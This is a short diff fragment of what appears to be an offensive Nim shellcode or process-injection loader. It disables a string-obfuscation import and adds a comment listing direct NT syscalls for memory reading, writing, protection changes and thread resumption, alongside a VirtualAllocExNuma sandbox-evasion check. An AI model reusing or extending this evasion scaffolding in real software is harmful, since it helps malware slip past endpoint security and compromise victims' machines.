@@ -10,10 +10,19 @@ import strformat
 import winim
 import nimcrypto
 import random
-import strenc # add a bit more of obfuscation for embedded strings
+#import strenc # add a bit more of obfuscation for embedded strings
 import strformat
 
 include syscalls
+# use https://github.com/ajpc500/NimlineWhispers2
+#[
+    NtQueryInformationProcess
+    NtReadVirtualMemory
+    NtProtectVirtualMemory
+    NtWriteVirtualMemory
+    NtResumeThread
+    NtClose 
+]#
 
 proc WeirdApi(): bool =
     let mem = VirtualAllocExNuma(
